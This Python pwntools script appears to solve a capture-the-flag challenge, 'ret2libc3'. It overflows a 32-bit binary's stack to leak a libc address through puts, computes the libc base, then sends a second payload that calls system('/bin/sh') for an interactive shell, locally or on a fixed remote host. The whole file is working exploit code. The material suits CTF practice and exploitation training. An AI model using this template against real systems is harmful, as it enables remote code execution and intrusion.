from pwn import *

local = 1
pc = './ret2libc3'
aslr = False
context.log_level = True
context.terminal = ["tmux","splitw","-h"]

ret2libc3 = ELF('./ret2libc3')
libc = ELF('./libc6_2.31-0ubuntu9.9_i386.so')

if local==1:
    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    p = process(pc, aslr=aslr)
else:
    remote_addr = ['111.198.29.45', 39802]
    p = remote(remote_addr[0], remote_addr[1])

def debug(b=""):
    gdb.attach(p, b)
    pause()

def lg(s, addr):
    log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, addr))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8, '\x00'))
    else:
        return u64(rl().strip('\n').ljust(8, '\x00'))

ru = lambda x : p.recvuntil(x)
rud = lambda x : p.recvuntil(x, drop=True)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a, b)
sla = lambda a,b : p.sendlineafter(a, b)
pi = lambda : p.interactive()


if __name__ == '__main__':
    puts_plt = ret2libc3.plt['puts']
    libc_start_main_got = ret2libc3.got['__libc_start_main']
    start_addr = ret2libc3.symbols['_start']

    payload = b'a'*0x6c
    payload += b'b'*4
    payload += p32(puts_plt)
    payload += p32(start_addr)
    payload += p32(libc_start_main_got)

    sla(b'Can you find it !?', payload)

    libc_start_main_addr = u32(p.recv()[0:4])
    lg('libc_start_main_addr', libc_start_main_addr)

    libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main']
    lg('libc_base_addr', libc_base_addr)

    libc.address = libc_base_addr
    system_addr = libc.symbols['system']
    binsh_addr = libc.search(b"/bin/sh").__next__()

    payload = b'a'*0x6c
    payload += b'b'*4
    payload += p32(system_addr)
    payload += p32(0xdeadbeef)
    payload += p32(binsh_addr)

    sla(b'Can you find it !?', payload)

    pi()
